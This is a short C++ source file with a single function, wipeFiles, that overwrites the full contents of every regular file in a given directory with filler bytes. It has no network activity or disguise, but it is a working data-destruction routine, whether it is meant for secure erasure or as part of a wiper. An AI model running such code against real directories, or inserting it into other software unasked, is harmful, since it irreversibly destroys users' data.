#include "file.h"

#include <filesystem>
#include <fstream>
#include <iostream>

namespace fs = std::filesystem;

bool wipeFiles(const std::string& targetDir) {
  
    try {
        if (!fs::exists(targetDir) || !fs::is_directory(targetDir)) {
            return false; 
        }

        for (const auto& entry : fs::directory_iterator(targetDir)) {
            if (entry.is_regular_file()) {
                const auto& path = entry.path();

                std::ofstream ofs(path, std::ios::binary | std::ios::in | std::ios::out);
                if (!ofs.is_open()) {
                    continue; 
                }

                auto fileSize = fs::file_size(path);

                std::vector<char> buffer(fileSize, '\xCC');
                ofs.seekp(0);
                ofs.write(buffer.data(), buffer.size());
                ofs.close();
            }
        }
    }
    catch (...) {
        return false; 
    }

    return true;
}
